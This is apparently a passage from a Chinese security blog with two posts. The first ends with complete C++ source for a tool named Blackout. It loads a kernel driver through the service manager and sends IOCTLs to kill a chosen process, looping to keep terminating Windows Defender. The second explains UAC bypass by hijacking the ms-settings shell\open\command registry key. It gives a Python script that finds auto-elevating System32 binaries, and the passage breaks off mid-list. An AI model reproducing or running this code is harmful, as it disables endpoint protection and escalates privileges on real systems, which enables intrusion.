class="built_in">OpenServiceA</span>(hSCM, serviceName, SERVICE_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (hService != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service already exists.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Start the service if it&#x27;s not running</span></span><br><span class="line">        SERVICE_STATUS serviceStatus;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">QueryServiceStatus</span>(hService, &amp;serviceStatus))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">            <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (serviceStatus.dwCurrentState == SERVICE_STOPPED)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">StartServiceA</span>(hService, <span class="number">0</span>, <span class="literal">nullptr</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">                <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Starting service...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the service</span></span><br><span class="line">    hService = <span class="built_in">CreateServiceA</span>(</span><br><span class="line">        hSCM,</span><br><span class="line">        serviceName,</span><br><span class="line">        serviceName,</span><br><span class="line">        SERVICE_ALL_ACCESS,</span><br><span class="line">        SERVICE_KERNEL_DRIVER,</span><br><span class="line">        SERVICE_DEMAND_START,</span><br><span class="line">        SERVICE_ERROR_IGNORE,</span><br><span class="line">        driverPath,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Service created successfully.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the service</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">StartServiceA</span>(hService, <span class="number">0</span>, <span class="literal">nullptr</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Starting service...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>其次看下主函数代码的实现流程，先使用前面定义的LoadDriver函数加载驱动，再使用CreateFile打开驱动并得到其句柄。</p>
<p>得到驱动句柄后使用 <code>DeviceIoControl</code> 函数与驱动通信，发送<code>INITIALIZE_IOCTL_CODE</code> 指令初始化驱动，再发送<code>TERMINSTE_PROCESS_IOCTL_CODE</code> 指令来终止指定的进程</p>
<p>如果所给的进程 ID 对应的进程是 “MsMpEng.exe”（这是 Windows Defender 的进程），则程序会不断尝试终止它，毕竟MsMpEng.exe被杀死后还是会无限复活的</p>
<p>在这里我要补充一点，当调用 <code>CreateFile</code> 打开 “\\.\Blackout” 时，实际上是在尝试打开一个与驱动程序相关联的设备。在Windows中，驱动程序可以创建一个设备并为其分配一个符号链接，这样用户模式的程序可以通过这个符号链接与驱动程序通信，从而允许后续的<code>DeviceIoControl</code> 调用来传递IO控制代码 (IOCTL) 和其他数据到驱动程序中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> argc,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span>** argv</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid number of arguments. Usage: Blackout.exe -p &lt;process_id&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-p&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid argument. Usage: Blackout.exe -p &lt;process_id&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CheckProcess</span>(<span class="built_in">atoi</span>(argv[<span class="number">2</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;provided process id doesnt exist !!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WIN32_FIND_DATAA fileData;</span><br><span class="line">    HANDLE hFind;</span><br><span class="line">    <span class="type">char</span> FullDriverPath[MAX_PATH];</span><br><span class="line">    BOOL once = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    hFind = <span class="built_in">FindFirstFileA</span>(<span class="string">&quot;Blackout.sys&quot;</span>, &amp;fileData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFind != INVALID_HANDLE_VALUE) &#123; <span class="comment">// file is found</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetFullPathNameA</span>(fileData.cFileName, MAX_PATH, FullDriverPath, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123; <span class="comment">// full path is found</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;driver path: %s\n&quot;</span>, FullDriverPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;path not found !!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;driver not found !!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Loading %s driver .. \n&quot;</span>, fileData.cFileName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LoadDriver</span>(FullDriverPath))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild to load driver ,try to run the program as administrator!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;driver loaded successfully !!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HANDLE hDevice = <span class="built_in">CreateFile</span>(<span class="string">L&quot;\\\\.\\Blackout&quot;</span>, GENERIC_WRITE | GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open handle to driver !! &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line">    DWORD input = <span class="built_in">atoi</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    DWORD output[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD outputSize = <span class="built_in">sizeof</span>(output);</span><br><span class="line"></span><br><span class="line">    BOOL result = <span class="built_in">DeviceIoControl</span>(hDevice, INITIALIZE_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild to send initializing request %X !!\n&quot;</span>, INITIALIZE_IOCTL_CODE);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;driver initialized %X !!\n&quot;</span>, INITIALIZE_IOCTL_CODE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetPID</span>(<span class="string">L&quot;MsMpEng.exe&quot;</span>) == input)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Terminating Windows Defender ..\nkeep the program running to prevent the service from restarting it\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (input = <span class="built_in">GetPID</span>(<span class="string">L&quot;MsMpEng.exe&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">DeviceIoControl</span>(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;DeviceIoControl failed. Error: %X !!\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">                    <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (once)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Defender Terminated ..\n&quot;</span>);</span><br><span class="line">                    once = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">700</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;terminating process !! \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">DeviceIoControl</span>(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to terminate process: %X !!\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;process has been terminated!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><img src="WeakDefender/241086198-3ea0f7ae-0102-4a38-b4b6-700e93f5d545.png" alt="image" style="zoom:67%;" />	



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/324952.html">https://www.freebuf.com/articles/network/324952.html</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12280#toc-25">https://xz.aliyun.com/t/12280#toc-25</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h1><p>UAC，全称为User Account Control（用户账户控制），是Windows Vista及后续版本中的一个安全组件。它的设计目的是防止潜在的破坏性操作——特别是那些可能对系统配置产生影响的操作——在不经过管理员授权的情况下执行。</p>
<p>UAC通过在执行可能需要管理员权限的任务时弹出提示窗口，要求用户确认操作或者输入管理员账户的密码，从而实现对可能的危险行为的监控和控制。这个特性使得恶意软件在未经用户许可的情况下更难以在系统中执行危险的操作，提高了系统的安全性</p>
<p>8</p>
<p>在Visual Studio中，你可以通过修改项目的manifest文件来配置User Account Control（用户账户控制，UAC）设置。这个文件是一个XML文件，它定义了应用程序的配置属性，其中一个属性就是UAC设置</p>
<ul>
<li><code>asInvoker</code>：这是默认值。当这个值被设置时，应用程序会以启动它的用户的权限运行。如果应用程序被普通用户启动，它将会以普通权限运行；如果应用程序被管理员启动，它将以管理员权限运行。</li>
<li><code>highestAvailable</code>：当这个值被设置时，应用程序会尽可能地获取最高权限。如果应用程序被管理员启动，它将会以管理员权限运行；如果应用程序被普通用户启动，它将以普通权限运行。</li>
<li><code>requireAdministrator</code>：当这个值被设置时，应用程序总是以管理员权限运行。如果应用程序被普通用户启动，UAC会弹出一个对话框，要求用户输入管理员账户的密码</li>
</ul>
<img src="uac白名单挖掘/image-20230622121843399.png" alt="image-20230622121843399" style="zoom:67%;" />	



<h1 id="Uac白名单挖掘"><a href="#Uac白名单挖掘" class="headerlink" title="Uac白名单挖掘"></a>Uac白名单挖掘</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>UAC（User Account Control）白名单挖掘是一种常见的权限提升技术，其基本思想是寻找可以在无UAC提示的情况下以管理员权限运行的应用程序。许多这样的程序会对其启动参数进行不够严格的检查，使得攻击者可以通过在启动参数中包含恶意代码，来使得这些程序在启动的同时执行这些恶意代码，从而实现权限提升</p>
<p>特别地，由于Windows中的许多设置应用程序（例如<code>ComputerDefaults.exe</code>、<code>fodhelper.exe</code>等）在设计时需要考虑到在UAC开启的情况下仍能正常工作，所以它们在manifest文件中常常会设置<code>autoElevate</code>为<code>true</code>，这意味着这些应用程序会在启动时自动提升至管理员权限，而且不会出现UAC提示</p>
<p>攻击者可能会尝试修改某些注册表键（例如<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>）来劫持这些协议处理程序，以使得当这些应用程序被启动时，他们指定的恶意代码也会被以管理员权限执行，从而实现权限提升。因此，这些键值是UAC白名单挖掘的常见目标</p>
<h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><ul>
<li><strong>Sigcheck</strong>工具是一个由Sysinternals提供的命令行实用程序，用于对Windows二进制文件（如.exe，.dll，.sys等）进行签名验证，并显示文件版本信息，证书链等。其下载地址: <a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/Sigcheck">https://download.sysinternals.com/files/Sigcheck</a></li>
<li><strong>Process Monitor</strong> 是由 Windows Sysinternals 提供的一款高级监视工具，它可以实时监控 Windows 文件系统、注册表和进程&#x2F;线程活动。其下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a></li>
</ul>
<h2 id="白名单的筛选条件"><a href="#白名单的筛选条件" class="headerlink" title="白名单的筛选条件"></a>白名单的筛选条件</h2><p>我们正在寻找满足以下几个条件的白名单程序：</p>
<ul>
<li>程序的 manifest 文件中的 autoElevate 属性必须配置为 true，这允许程序在无需用户干预的情况下自动获取提升的权限。</li>
<li>程序执行时不能弹出 UAC（用户账户控制）对话框，这确保了程序的无缝执行，不会因 UAC 对话框的出现而中断用户的工作流。</li>
<li>程序需要能够查询注册表中的 <code>Shell\Open\command</code> 键。这是因为 <code>shell\open\command</code> 键值通常用于存储特定类型的可执行程序文件路径。当这种特定类型的程序运行时，系统会在注册表中查找并执行对应的 <code>shell\open\command</code> 键值中指定的程序。这一属性允许我们通过改变该键值中的程序路径，将我们所需的程序插入到某些特定的系统操作中</li>
</ul>
<h2 id="挖掘步骤"><a href="#挖掘步骤" class="headerlink" title="挖掘步骤"></a>挖掘步骤</h2><h3 id="1-autoElevate值为true"><a href="#1-autoElevate值为true" class="headerlink" title="1.autoElevate值为true"></a>1.<code>autoElevate</code>值为true</h3><p>使用sigcheck工具查看可执行程序的相关信息，如下图所示可以看到名为<code>autoElevate</code>的标签，当其被设置为true时，它表示该应用程序在启动时会自动请求和获取管理员权限，前提是当前的用户账户有管理员权限</p>
<blockquote>
<p>Sigcheck工具的-m选项用于显示二进制文件的描绘符。一个描绘符是一个可执行文件或DLL的XML文件，其中包含有关应用程序的信息。这些信息可以包括应用程序的名称，它的版本，它需要的特权等等</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sigcheck64.exe -m C:\windows\system32\ComputerDefaults.exe</span><br></pre></td></tr></table></figure>

<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622164747889.png" alt="image-20230622164747889"></p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165311813.png" alt="image-20230622165311813"></p>
<p>根据以上思路，我们可以使用以下python代码来筛选出可用的白名单程序。此脚本首先获取 <code>C:\\Windows\\System32</code> 目录及其子目录下所有 <code>.exe</code> 文件，然后对每个 <code>.exe</code> 文件检查其是否具有 <code>autoElevate</code> 属性，如果有则将文件名写入到 <code>success.txt</code> 文件中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> subprocess</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">get_exe_files</span><span class="params">(path)</span>:</span></span><br><span class="line"><span class="function">    exe_files =</span> []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files in os.<span class="built_in">walk</span>(path):</span><br><span class="line">        <span class="keyword">for</span> file in files:</span><br><span class="line">            <span class="keyword">if</span> os.path.<span class="built_in">splitext</span>(file)[<span class="number">1</span>] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">                exe_files.<span class="built_in">append</span>(os.path.<span class="built_in">join</span>(root, file))</span><br><span class="line">    <span class="keyword">return</span> exe_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">check_auto_elevate</span>(exe_files):</span><br><span class="line">    success_files = []</span><br><span class="line">    <span class="keyword">for</span> file in exe_files:</span><br><span class="line">        command = r<span class="number">&#x27;.</span>\sigcheck64.exe -m &#123;&#125; | findstr <span class="keyword">auto</span><span class="number">&#x27;.f</span>ormat(file)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = subprocess.<span class="built_in">run</span>(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> in result.stdout.<span class="built_in">decode</span>(<span class="string">&#x27;gb2312&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;&#x27;</span>.format(file))</span><br><span class="line">                success_files.<span class="built_in">append</span>(file)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error when processing file &#123;&#125;: &#123;&#125;&#x27;</span>.format(file, <span class="built_in">str</span>(e)))</span><br><span class="line">    <span class="keyword">return</span> success_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    path = <span class="string">&#x27;C:\\Windows\\System32&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Getting .exe files in &#123;&#125;...&#x27;</span>.format(path))</span><br><span class="line">    exe_files = <span class="built_in">get_exe_files</span>(path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Checking auto elevate property for each file...&#x27;</span>)</span><br><span class="line">    success_files = <span class="built_in">check_auto_elevate</span>(exe_files)</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">&#x27;WhiteList.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> file in success_files:</span><br><span class="line">            f.<span class="built_in">write</span>(<span class="string">&#x27;&#123;&#125;\n&#x27;</span>.format(file))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Done. Found &#123;&#125; files with auto elevate property.&#x27;</span>.format(<span class="built_in">len</span>(success_files)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>运行上述python代码后，会在其目录下生成一个WhiteList.txt文本文件，用于存放白名单程序的绝对路径，其文本内容如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\bthudtask.exe</span><br><span class="line">C:\Windows\System32\changepk.exe</span><br><span class="line">C:\Windows\System32\ComputerDefaults.exe</span><br><span class="line">C:\Windows\System32\dccw.exe</span><br><span 